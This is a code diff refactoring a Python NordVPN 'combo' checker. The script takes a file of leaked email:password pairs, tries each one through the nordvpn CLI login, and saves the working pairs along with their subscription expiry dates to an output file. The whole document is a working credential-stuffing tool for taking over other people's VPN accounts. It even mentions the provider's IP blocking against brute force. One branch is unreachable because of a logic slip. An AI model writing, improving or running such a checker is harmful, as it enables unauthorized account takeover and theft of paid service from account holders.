@@ -10,94 +10,128 @@ R = '\033[91m'  # Red
 E = '\033[0m'   # Erase (the default color)
 B = '\033[34m'  # Blue
 
-# initiate argument parser
-parser = argparse.ArgumentParser(
-    description='Check NordVPN login'
-)
 
-# add argument to parser
-parser.add_argument(
-    '-f',
-    '--file',
-    help='The file that contains your email:pass',
-    action='store',
-    required=True,
-    metavar='file'
-)
+def read_arguments():
 
-args = parser.parse_args()
+    parser = argparse.ArgumentParser(
+        description='Check NordVPN login'
+    )
 
-combo_file_path = args.file
+    parser.add_argument(
+        '-f',
+        '--file',
+        help='The file that contains your email:pass entries',
+        action='store',
+        required=True,
+        metavar='FILE'
+    )
 
-if not os.path.isfile(combo_file_path):
-    print('The path specified does not exist', combo_file_path)
-    sys.exit()
+    parser.add_argument(
+        '-o',
+        '--output',
+        help='The file to output the successful email:pass entries to',
+        action='store',
+        required=True,
+        metavar='FILE'
+    )
 
-# make sure you're logged out of NordVPN
-subprocess.run(['nordvpn', 'logout'], capture_output=True)
+    return parser.parse_args()
 
-# check if the specified file is empty
-if os.stat(combo_file_path).st_size == 0:
-    print('The file specified is empty.')
-    sys.exit()
 
-with open(combo_file_path) as combo_file:
-    count = 0
+def check_login(email, password):
+    # make sure you're logged out of NordVPN
+    subprocess.run(['nordvpn', 'logout'], capture_output=True)
 
-    for line in combo_file:
-        count += 1
-
-        if not line.strip():  # ignore empty lines in file
-            continue
-
-        # your combo file must be separated by `:`
-        email, password = line.strip().split(':')
-
-        # making output more user friendly
-        print(B + f'{count}) Checking ➜', W +
-              f'{email}:{password}\r' + E, end='')
-
-        login_result = subprocess.run(
-            ['nordvpn', 'login', '-u', email, '-p', password],
-            capture_output=True,
-            text=True
-        )
-
-        if not login_result.returncode == 0:
-            "This means that login was not successful"
-            print(
-                B + f'{count}) Checking ➜',
-                W + f'{email}:{password}',
-                '\t\t\t',
-                R + 'Failed' + E
-            )
-            continue
-
+    login_result = subprocess.run(
+        ['nordvpn', 'login', '-u', email, '-p', password],
+        capture_output=True,
+        text=True
+    )
+    if not login_result.returncode == 0:
+        # Failed to login
+        return False
+    else:
+        # Ensure the user is logged in
         account_info = subprocess.run(
             ['nordvpn', 'account'],
             capture_output=True,
             text=True
         )
-
-        # to make sure that `nordvpn account` gives correct output
         if 'You are not logged in.' in account_info.stdout:
-            msg = R + f"""
-            Something is wrong.
-            To prevent brute force, NordVPN blocks your IP for a while.
-            Try again later.
-            """ + E
-            print(msg)
-            sys.exit()
+            return None
+        else:
+            return account_info.stdout
 
-        account_expiration_date = account_info.stdout.split('VPN Service: ')[1]
 
-        print(
-            B + f'{count}) Checking ➜',
-            W + f'{email}:{password}\t\t',
-            G + account_expiration_date.rstrip() + E
-        )
+def parse_expiration_date(login_result):
+    return login_result.split('VPN Service: ')[
+        1].rstrip()
 
-        subprocess.run(
-            ['nordvpn', 'logout'],
-            capture_output=True
-        )
+
+def read_file(args):
+    input_file_path = args.file
+    output_file_path = args.output
+
+    if not os.path.isfile(input_file_path):
+        print('The path specified does not exist', input_file_path)
+        sys.exit()
+
+    # check if the specified file is empty
+    if os.stat(input_file_path).st_size == 0:
+        print('The file specified is empty.')
+        sys.exit()
+
+    with open(input_file_path) as f:
+        for count, line in enumerate(f):
+            count += 1
+            if not line.strip():  # ignore empty lines in file
+                continue
+
+            email, password = line.strip().split(':')
+            print(B + f'{count} Checking ➜', W +
+                  f'{email}:{password}\r' + E, end='')
+
+            login_result = check_login(email, password)
+
+            if not login_result:
+                # Failed to login
+                print(
+                    B + f'{count}) Checking ➜',
+                    W + f'{email}:{password}',
+                    '\t\t\t',
+                    R + 'Failed' + E
+                )
+            elif login_result is None:
+                # No response from NordVPN
+                print(
+                    B + f'{count}) Checking ➜',
+                    W + f'{email}:{password}',
+                    '\t\t\t',
+                    R + 'No response' + E
+                )
+                print(
+                    R+"NordVPN might be temporarily blocking your IP due to too many requests."+E)
+            else:
+                account_expiration_date = parse_expiration_date(login_result)
+                print(
+                    B + f'{count}) Checking ➜',
+                    W + f'{email}:{password}\t\t',
+                    G + account_expiration_date + E
+                )
+                append_to_output_file(output_file_path, f'{email}:{password}')
+
+
+# Appends username:password entry to the specified output file
+def append_to_output_file(file_path, entry):
+    with open(file_path, "a") as output_file:
+        output_file.write(entry + "\r\n")
+
+
+if __name__ == "__main__":
+    args = read_arguments()
+
+    # Initialize the script
+    try:
+        read_file(args)
+    except KeyboardInterrupt:
+        print(R+"\nQuitting..."+E)
